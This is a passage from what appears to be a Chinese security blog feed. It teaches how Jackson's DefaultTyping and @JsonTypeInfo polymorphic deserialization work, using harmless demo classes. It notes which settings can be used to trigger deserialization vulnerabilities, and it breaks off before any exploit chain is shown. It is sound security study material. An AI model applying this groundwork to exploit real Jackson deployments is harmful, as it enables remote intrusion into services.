href="https://boogipop.com/2024/02/12/%E6%98%93%E6%87%82%E7%9A%84Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/">https://boogipop.com/2024/02/12/%E6%98%93%E6%87%82%E7%9A%84Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/</a></p><p>Rome反序列化</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;之前没学习过rome反序列化这里学习一下因为能和二次反序列化结合&lt;/p&gt;
&lt;h2 id=&quot;介绍&quot;&gt;介绍&lt;/h2&gt;
&lt;p&gt;ROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Jav</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反序列化" scheme="https://oceanzbz.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="Rome" scheme="https://oceanzbz.github.io/tags/Rome/"/>
    
  </entry>
  
  <entry>
    <title>Jackson反序列化</title>
    <link href="https://oceanzbz.github.io/post/30f24f14.html"/>
    <id>https://oceanzbz.github.io/post/30f24f14.html</id>
    <published>2024-12-30T06:11:55.000Z</published>
    <updated>2025-03-05T07:24:36.790Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>这里直接引用别的师傅的</p><p>Jackson是一个流行的Java库，用于处理JSON格式的数据。它提供了一组功能强大的工具，可以方便地在Java对象和JSON之间进行转换。以下是关于Jackson库的介绍：</p><p>Jackson库包括三个主要的模块：<code>jackson-databind</code>、<code>jackson-annotations</code>和<code>jackson-core</code>。</p><ol><li><code>jackson-databind</code>模块：这是Jackson库的核心模块，提供了将Java对象序列化为JSON格式以及将JSON格式反序列化为Java对象的功能。它包含了<code>ObjectMapper</code>类，用于执行对象和JSON之间的转换操作，以及一些注解（如<code>@JsonProperty</code>、<code>@JsonIgnore</code>等），用于控制对象和JSON属性之间的映射关系。</li><li><code>jackson-annotations</code>模块：这个模块包含了一些用于对Java对象进行标记的注解，用于指示Jackson库如何处理对象的序列化和反序列化。这些注解使得开发人员可以在对象上方便地定义与JSON映射相关的信息，例如指定属性名、忽略某些属性等。</li><li><code>jackson-core</code>模块：这个模块提供了用于处理JSON数据的低级API，例如读取和写入JSON流、构建JSON树结构等。虽然大多数开发人员更倾向于使用<code>jackson-databind</code>模块，但在一些特定的场景下，直接使用<code>jackson-core</code>模块也是非常有用的。</li></ol><p>Jackson 功能很强大，既能满足简单的序列化和反序列化操作，也能实现复杂的、个性化的序列化和反序列化操作。到目前为止，Jackson 的序列化和反序列化性能都非常优秀，已经是国内外大部分 JSON 相关编程的首选工具。Jackson从 2.0 开始改用新的包名 fasterxml，1.x 版本的包名是 codehaus。除了包名不同，他们的 Maven artifact id 也不同。1.x 版本现在只提供 bug-fix，而 2.x 版本还在不断开发和发布中。如果是新项目，建议直接用 2x，即 fasterxml jackson。</p><h2 id="序列化和反序列化">序列化和反序列化</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        Person zbz = new Person(<span class="number">22</span>, <span class="string">&quot;zbz&quot;</span>);</span><br><span class="line">        ObjectMapper objectMapper = new ObjectMapper();</span><br><span class="line">        //序列化</span><br><span class="line">        String s = objectMapper.writeValueAsString(zbz);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        //反序列化</span><br><span class="line">        String jack = <span class="string">&quot;&#123;\&quot;age\&quot;:22,\&quot;name\&quot;:\&quot;zbz\&quot;&#125;&quot;</span>;</span><br><span class="line">        Person person = objectMapper.readValue(jack, Person.<span class="keyword">class</span>);</span><br><span class="line">        System.out.println(person.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">//输出</span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">22</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;</span><br><span class="line"><span class="number">22</span></span><br></pre></td></tr></table></figure><p>这里只是简单的序列化和反序列化</p><h2 id="多态问题的解决">多态问题的解决</h2><p>直接引用<a href="http://www.mi1k7ea.com/">Mi1k7ea</a>师傅的解释</p><p>简单地说，Java多态就是同一个接口使用不同的实例而执行不同的操作。</p><p>那么问题来了，如果对多态类的某一个子类实例在序列化后再进行反序列化时，如何能够保证反序列化出来的实例即是我们想要的那个特定子类的实例而非多态类的其他子类实例呢？——Jackson实现了JacksonPolymorphicDeserialization机制来解决这个问题。</p><p>JacksonPolymorphicDeserialization即Jackson多态类型的反序列化：在反序列化某个类对象的过程中，如果类的成员变量不是具体类型（non-concrete），比如Object、接口或抽象类，则可以在JSON字符串中指定其具体类型，Jackson将生成具体类型的实例。</p><p>简单地说，就是将具体的子类信息绑定在序列化的内容中以便于后续反序列化的时候直接得到目标子类对象，其实现有两种，即DefaultTyping和@JsonTypeInfo注解。</p><h3 id="DefaultTyping">DefaultTyping</h3><p>Jackson提供一个enableDefaultTyping设置，其包含4个值，查看jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/ObjectMapper.java可看到相关介绍信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">DefaultTyping</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * This value means that only properties that have</span></span><br><span class="line"><span class="comment">        * &#123;<span class="doctag">@link</span> java.lang.Object&#125; as declared type (including</span></span><br><span class="line"><span class="comment">        * generic types without explicit type) will use default</span></span><br><span class="line"><span class="comment">        * typing.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    JAVA_LANG_OBJECT,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for</span></span><br><span class="line"><span class="comment">        * properties with declared type of &#123;<span class="doctag">@link</span> java.lang.Object&#125;</span></span><br><span class="line"><span class="comment">        * or an abstract type (abstract class or interface).</span></span><br><span class="line"><span class="comment">        * Note that this does &lt;b&gt;not&lt;/b&gt; include array types.</span></span><br><span class="line"><span class="comment">        *&lt;p&gt;</span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    OBJECT_AND_NON_CONCRETE,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for</span></span><br><span class="line"><span class="comment">        * all types covered by &#123;<span class="doctag">@link</span> #OBJECT_AND_NON_CONCRETE&#125;</span></span><br><span class="line"><span class="comment">        * plus all array types for them.</span></span><br><span class="line"><span class="comment">        *&lt;p&gt;</span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    NON_CONCRETE_AND_ARRAYS,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for</span></span><br><span class="line"><span class="comment">        * all non-final types, with exception of small number of</span></span><br><span class="line"><span class="comment">        * &quot;natural&quot; types (String, Boolean, Integer, Double), which</span></span><br><span class="line"><span class="comment">        * can be correctly inferred from JSON; as well as for</span></span><br><span class="line"><span class="comment">        * all arrays of non-final types.</span></span><br><span class="line"><span class="comment">        *&lt;p&gt;</span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    NON_FINAL</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>默认情况下，即无参数的enableDefaultTyping是第二个设置，OBJECT_AND_NON_CONCRETE。</p><h4 id="JAVA-LANG-OBJECT">JAVA_LANG_OBJECT</h4><p>当被序列化或反序列化的类里的属性被声明为一个Object类型时，会对该Object类型的属性进行序列化和反序列化，并且明确规定类名。（当然，这个Object本身也得是一个可被序列化的类）</p><p>加入一个测试类</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734963587128-3055166e-02cf-497e-8cc6-2880903b8e08.png" alt=""></p><p>改一下Person的属性</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734963594917-511d7ad6-f33a-4528-a310-87ef2a798e59.png" alt=""></p><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">zbz</span> <span class="variable">zbz1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">zbz</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">ocean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">22</span>, <span class="string">&quot;ocean&quot;</span>,zbz1);</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置JAVA_LANG_OBJECT</span></span><br><span class="line">        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> objectMapper.writeValueAsString(ocean);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出：&#123;<span class="string">&quot;age&quot;</span>:<span class="number">22</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;ocean&quot;</span>,<span class="string">&quot;object&quot;</span>:[<span class="string">&quot;com.ocean.zbz&quot;</span>,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure><p>可以看到序列化之后的属性带有类名并且直接zbz的对象</p><h4 id="OBJECT-AND-NON-CONCRETE">OBJECT_AND_NON_CONCRETE</h4><p>OBJECT_AND_NON_CONCRETE：除了前面提到的特征，当类里有Interface、AbstractClass类时，对其进行序列化和反序列化（当然这些类本身需要时合法的、可被序列化的对象）。此外，<strong>enableDefaultTyping()默认的无参数的设置就是此选项。</strong></p><p>引入一个接口进行测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">zbz</span> <span class="variable">zbz1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">zbz</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">ocean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">22</span>, <span class="string">&quot;ocean&quot;</span>,zbz1,<span class="keyword">new</span> <span class="title class_">addressImpl</span>());</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置JAVA_LANG_OBJECT</span></span><br><span class="line"><span class="comment">//        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        String json = objectMapper.writeValueAsString(ocean);</span></span><br><span class="line"><span class="comment">//        System.out.println(json);</span></span><br><span class="line">        <span class="comment">//OBJECT_AND_NON_CONCRETE</span></span><br><span class="line">        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> objectMapper.writeValueAsString(ocean);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">输出：&#123;<span class="string">&quot;age&quot;</span>:<span class="number">22</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;ocean&quot;</span>,<span class="string">&quot;object&quot;</span>:[<span class="string">&quot;com.ocean.zbz&quot;</span>,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;],<span class="string">&quot;address&quot;</span>:[<span class="string">&quot;com.ocean.addressImpl&quot;</span>,&#123;<span class="string">&quot;address&quot;</span>:<span class="number">0</span>&#125;]&#125;</span><br></pre></td></tr></table></figure><p>可以看到接口序列化成功</p><h4 id="NON-CONCRETE-AND-ARRAYS">NON_CONCRETE_AND_ARRAYS</h4><p>NON_CONCRETE_AND_ARRAYS：除了前面提到的特征外，还支持Array类型。</p><p>在改造一下改成带有数组的形式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">zbz[] zbz1 = <span class="keyword">new</span> <span class="title class_">zbz</span>[<span class="number">2</span>];</span><br><span class="line">        zbz1[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">zbz</span>();</span><br><span class="line">        zbz1[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">zbz</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">ocean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">22</span>, <span class="string">&quot;ocean&quot;</span>,zbz1,<span class="keyword">new</span> <span class="title class_">addressImpl</span>());</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        <span class="comment">//设置NON_CONCRETE_AND_ARRAYS</span></span><br><span class="line">        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> objectMapper.writeValueAsString(ocean);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">输出：&#123;<span class="string">&quot;age&quot;</span>:<span class="number">22</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;ocean&quot;</span>,<span class="string">&quot;object&quot;</span>:[<span class="string">&quot;[Lcom.ocean.zbz;&quot;</span>,[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;]],<span class="string">&quot;address&quot;</span>:[<span class="string">&quot;com.ocean.addressImpl&quot;</span>,&#123;<span class="string">&quot;address&quot;</span>:<span class="number">0</span>&#125;]&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出看到，类名变成了”[L”+类名+”;”，序列化Object之后为数组形式，反序列化之后得到[Lcom.mi1k7ea.Hacker;类对象，说明对Array类型成功进行了序列化</p><h4 id="NON-FINAL">NON_FINAL</h4><p>NON_FINAL：除了前面的所有特征外，包含即将被序列化的类里的全部、非final的属性，也就是相当于整个类、除final外的属性信息都需要被序列化和反序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">zbz[] zbz1 = <span class="keyword">new</span> <span class="title class_">zbz</span>[<span class="number">2</span>];</span><br><span class="line">        zbz1[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">zbz</span>();</span><br><span class="line">        zbz1[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">zbz</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">ocean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">22</span>, <span class="string">&quot;ocean&quot;</span>,zbz1,<span class="keyword">new</span> <span class="title class_">addressImpl</span>(),<span class="keyword">new</span> <span class="title class_">zbz</span>());</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置NON_CONCRETE_AND_ARRAYS</span></span><br><span class="line">        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> objectMapper.writeValueAsString(ocean);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">输出：[<span class="string">&quot;com.ocean.Person&quot;</span>,&#123;<span class="string">&quot;age&quot;</span>:<span class="number">22</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;ocean&quot;</span>,<span class="string">&quot;object&quot;</span>:[<span class="string">&quot;[Lcom.ocean.zbz;&quot;</span>,[[<span class="string">&quot;com.ocean.zbz&quot;</span>,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;],[<span class="string">&quot;com.ocean.zbz&quot;</span>,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;]]],<span class="string">&quot;address&quot;</span>:[<span class="string">&quot;com.ocean.addressImpl&quot;</span>,&#123;<span class="string">&quot;address&quot;</span>:<span class="number">0</span>&#125;],<span class="string">&quot;zbz&quot;</span>:[<span class="string">&quot;com.ocean.zbz&quot;</span>,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;]&#125;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功对非final属性的zbz进行了序列化</p><p>从前面的分析知道，DefaultTyping的几个设置选项是逐渐扩大适用范围的，如下表：</p><table><thead><tr><th style="text-align:left"><strong>DefaultTyping类型</strong></th><th style="text-align:left"><strong>描述说明</strong></th></tr></thead><tbody><tr><td style="text-align:left">JAVA_LANG_OBJECT</td><td style="text-align:left">属性的类型为Object</td></tr><tr><td style="text-align:left">OBJECT_AND_NON_CONCRETE</td><td style="text-align:left">属性的类型为Object、Interface、AbstractClass</td></tr><tr><td style="text-align:left">NON_CONCRETE_AND_ARRAYS</td><td style="text-align:left">属性的类型为Object、Interface、AbstractClass、Array</td></tr><tr><td style="text-align:left">NON_FINAL</td><td style="text-align:left">所有除了声明为final之外的属性</td></tr></tbody></table><h3 id="JsonTypeInfo注解">@JsonTypeInfo注解</h3><p>@JsonTypeInfo注解是Jackson多态类型绑定的一种方式，支持下面5种类型的取值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span></span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span></span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span></span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)</span></span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM)</span></span><br></pre></td></tr></table></figure><h4 id="JsonTypeInfo-Id-NONE">JsonTypeInfo.Id.NONE</h4><p>Person类，给object属性添加@JsonTypeInfo注解，指定为JsonTypeInfo.Id.NONE：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span></span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> address address;</span><br><span class="line">    <span class="keyword">public</span> zbz zbz;</span><br></pre></td></tr></table></figure><p>进行序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.object = <span class="keyword">new</span> <span class="title class_">zbz</span>();</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        <span class="comment">//JsonTypeInfo.Id.NONE</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> objectMapper.writeValueAsString(person);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">输出：&#123;<span class="string">&quot;age&quot;</span>:<span class="number">0</span>,<span class="string">&quot;name&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;object&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;,<span class="string">&quot;address&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;zbz&quot;</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure><p>输出看到，和没有设置值为JsonTypeInfo.Id.NONE的@JsonTypeInfo注解是一样的。</p><h4 id="JsonTypeInfo-Id-CLASS">JsonTypeInfo.Id.CLASS</h4><p>给Person类指定注解为JsonTypeInfo.Id.CLASS</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734965020177-0c0c1091-33f0-471d-ae7e-6d1a7b5e2031.png" alt=""></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">0</span>,<span class="string">&quot;name&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;object&quot;</span>:&#123;<span class="string">&quot;@class&quot;</span>:<span class="string">&quot;com.ocean.zbz&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;,<span class="string">&quot;address&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;zbz&quot;</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure><p>可以看到输出种多了&quot;@class&quot;:“com.ocean.zbz”，含有具体的class信息</p><h4 id="JsonTypeInfo-Id-MINIMAL-CLASS">JsonTypeInfo.Id.MINIMAL_CLASS</h4><p>给Person类指定JsonTypeInfo.Id.MINIMAL_CLASS<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734965117391-0fb27547-c185-47cf-a01e-c3731624f9e9.png" alt=""></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">0</span>,<span class="string">&quot;name&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;object&quot;</span>:&#123;<span class="string">&quot;@c&quot;</span>:<span class="string">&quot;com.ocean.zbz&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;,<span class="string">&quot;address&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;zbz&quot;</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure><p>输出看到，object属性中多了&quot;@c&quot;:“com.ocean.zbz”，即使用@c替代料@class，官方描述中的意思是缩短了相关类名，实际效果和JsonTypeInfo.Id.CLASS类似。</p><h4 id="JsonTypeInfo-Id-NAME"><a href="http://JsonTypeInfo.Id.NAME">JsonTypeInfo.Id.NAME</a></h4><p><a href="http://xn--PersonJsonTypeInfo-yz57aj42guy5iz4k.Id.NAME">给Person类指定JsonTypeInfo.Id.NAME</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734965225800-f6f708fc-f8a4-460f-b4fc-ebf1e4e2e8d5.png" alt=""></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">0</span>,<span class="string">&quot;name&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;object&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;zbz&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;,<span class="string">&quot;address&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;zbz&quot;</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure><p>输出看到，object属性中多了”@type”:”zbz”，但没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的：</p><h4 id="JsonTypeInfo-Id-CUSTOM">JsonTypeInfo.Id.CUSTOM</h4><p>其实这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常：</p><p>由前面测试发现，当@JsonTypeInfo注解设置为如下值之一并且修饰的是Object类型的属性时，可以利用来触发Jackson反序列化漏洞：</p><ul><li>JsonTypeInfo.Id.CLASS</li><li>JsonTypeInfo.Id.MINIMAL_CLASS</li></ul><p>这里都是参考自<a href="http://www.mi1k7ea.com/">Mi1k7ea</a>师傅的只是自己重新敲了一遍可以去看原文很易懂</p><h2 id="反序列化分析">反序列化分析</h2><h3 id="DefaultTyping-2">DefaultTyping</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"></span><br><span class="line">        person.address = <span class="keyword">new</span> <span class="title class_">addressImpl</span>();</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        objectMapper.enableDefaultTyping();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> objectMapper.writeValueAsString(person);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> objectMapper.readValue(<span class="string">&quot;&#123;\&quot;age\&quot;:0,\&quot;name\&quot;:null,\&quot;object\&quot;:null,\&quot;address\&quot;:[\&quot;com.ocean.addressImpl\&quot;,&#123;\&quot;address\&quot;:0&#125;],\&quot;zbz\&quot;:null&#125;&quot;</span>, Person.class);</span><br><span class="line">        System.out.println(person1);</span><br></pre></td></tr></table></figure><p>在序列化时会调用构造函数 和getter方法</p><p><img 